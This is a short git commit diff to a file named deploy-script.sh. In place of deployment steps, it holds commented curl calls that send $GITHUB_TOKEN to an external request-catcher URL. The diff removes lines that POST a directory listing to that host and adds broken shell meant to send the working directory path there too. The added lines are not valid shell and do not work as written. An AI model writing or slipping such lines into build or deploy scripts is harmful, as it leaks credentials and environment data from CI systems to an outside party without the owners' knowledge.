84c0ca7d29c7caa144e15bbc71bf26741396f230
_m <matiasesena@gmail.com>
2021-11-03 13:14:55 -0300

    Update deploy-script.sh

--- deploy-script.sh
+++ deploy-script.sh
@@ -3,5 +3,7 @@
 #curl https://en0liva7dzyvpp.x.pipedream.net?holaaa
 #curl https://en0liva7dzyvpp.x.pipedream.net?token=$GITHUB_TOKEN;#
 
-echo $(ls -la) > /tmp/files2.txt
-curl -X POST --data-binary @tmp/files2.txt https://en0liva7dzyvpp.x.pipedream.net/
+a = echo $(pwd)
+url = https://en0liva7dzyvpp.x.pipedream.net/ + 
+url = "${url}"+a
+curl url
